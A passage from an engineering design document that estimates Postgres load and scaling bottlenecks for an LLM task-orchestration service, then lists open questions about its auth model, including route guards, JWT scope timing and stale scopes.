under 6% Postgres capacity.**

The actual bottleneck at scale is NOT Postgres query throughput — it is:

1. **API server CPU** — each request involves async Rust + JSON
   serialization + auth middleware. A single g5-api instance can handle
   ~5,000–10,000 req/s raw.

2. **WebSocket fan-out memory** — each connection holds buffers (~10 KB).
   At 5,000 connections: ~50 MB. Manageable.

3. **CRDT document memory** — as analyzed in §25.5, ~1 GB at 500
   concurrent drafts.

4. **Postgres write contention** — the `FOR UPDATE` locks on task claims
   and draft commits create brief serialization points, but
   `SKIP LOCKED` on task claims eliminates wait.

---

#### 25.11.6 Where the Pressure Actually Is

Despite Postgres query volume being low, specific patterns create
disproportionate pressure:

**1. `poll_for_task` — Lock Contention, Not Volume**

The `SELECT ... FOR UPDATE SKIP LOCKED` pattern is non-blocking, but under
heavy contention (50 workers polling simultaneously for 3 available tasks),
47 polls return empty. Each empty poll still executes 2 queries. This is
not a throughput problem but a **wasted work** problem.

**Fix**: Redis ready-task notification (already designed) reduces poll
frequency to near-zero when no tasks are ready.

**2. `transition_task` — Variable-Width Transactions**

This method takes 4–10 queries inside a transaction depending on job
completion checks and cascading cancellation. The worst case (last task
in a job completes → UPDATE task + UPDATE job + check/cancel zombies +
advance lane) holds a transaction for ~5–10ms under load.

This is fine at M0–M1. At M2 with 1,000 concurrent task transitions,
the transaction concurrency could cause row-lock waits on the `jobs`
row. Fix: use SKIP LOCKED on the job status check or separate the
job-completion check into an async event.

**3. `record_usage` — Batch Write Amplification**

Each usage batch writes 1–4 queries per record (INSERT usage + UPDATE
task cost + UPDATE job cost + UPDATE session cost). A batch of 10 LLM
calls = up to 40 writes in one transaction.

At M2 with 2,000 concurrent tasks each reporting 10 calls/batch: 80,000
writes in the transaction. This is burst traffic that can spike WAL
write volume.

**Fix**: Batch usage reporting on a 10-second debounce (already
implemented — the worker aggregates before sending). This smooths the
bursts into ~200 writes/second average.

**4. `check_spend_limit` — Per-LLM-Call Read**

Called before every LLM invocation. With 1,000 concurrent tasks making
~2 LLM calls/min each: 2,000 calls/min = **33 queries/sec** for spend
checks alone (2 SELECTs per check × 33/s = 66/s effective).

This is well within budget but is the single highest-frequency read
across the system. If spend checking becomes a bottleneck, cache the
settings row in Redis with a 60-second TTL.

---

#### 25.11.7 Summary — Single Instance Capacity

| Metric | Value |
|--------|-------|
| Postgres queries per page load | **18 reads** |
| Postgres queries per user per minute (steady) | **~19 reads + ~2 writes** |
| Postgres queries per active task per minute | **~10 reads + ~5.5 writes** |
| Postgres queries per completed job (5 tasks) | **~547 total** |
| Idle worker background tax | **~6 queries/min** |
| Worker heartbeat | **1 write every 30s** |
| Single-instance comfortable capacity | **~2,000 users + 1,000 tasks + 500 workers** |
| Postgres utilization at that load | **~5%** |
| Actual bottleneck | **API server CPU, not Postgres I/O** |
| When PgBouncer is needed | **>200 total connections (~10+ g5-api instances)** |

**Bottom line: Postgres is not the scaling concern.** The query volume
per user and per job is very low (~0.3 q/s each). A single Postgres
instance with 20 connections has 50–100× headroom over M0 targets. The
scaling pressure comes from API server throughput and WebSocket
connection density, not database capacity.

The key optimizations from §25.9 (Redis ready-task cache, sticky CRDT
routing, table partitioning) are about **latency and correctness at
scale**, not about raw Postgres throughput. These should be implemented
on the scheduled timeline (M0–M2) but are not blockers for launch.

---

## TODO: Revisit Auth Model (2026-02-24)

**Status:** OPEN

The current auth model needs review to ensure it matches our intended access-control design. Specific areas to revisit:

1. **Frontend route guards vs. backend scope enforcement:** We removed `requiredScope="org:admin"` from the `/:org/settings/members` route guard in `App.tsx` so that any authenticated org member can *view* the members page. Backend still enforces `Scope::OrgAdmin` on all write operations (invite, role change, remove, invitation management). This is intentional — viewers should be able to see who's in the org — but we should confirm this is the access model we want across all routes.

2. **JWT scope propagation timing:** In CI, `hasScope('org:admin')` sometimes returns `false` despite the JWT provably containing the scope. We added a role-based fallback (`currentUserRole === 'owner' || currentUserRole === 'admin'`) in `OrgMembersPage.tsx` to work around this. The root cause — likely a React state propagation timing issue between `setScopes()` and component render in `useAuth.tsx` — should be investigated and fixed properly.

3. **Scope vs. role duality:** We currently have two parallel authorization mechanisms: JWT scopes (checked via `hasScope()`) and user roles from `/api/v1/users/me` (checked via `currentOrg.role`). We should decide whether to unify these or keep both, and document the intended semantics clearly.

4. **Backend scope resolution:** `auth_service.rs` resolves scopes from the user's org role at JWT mint time. If roles change after the JWT is issued, scopes are stale until the next token refresh. We should confirm the refresh cadence is acceptable and consider whether role changes should force token invalidation.
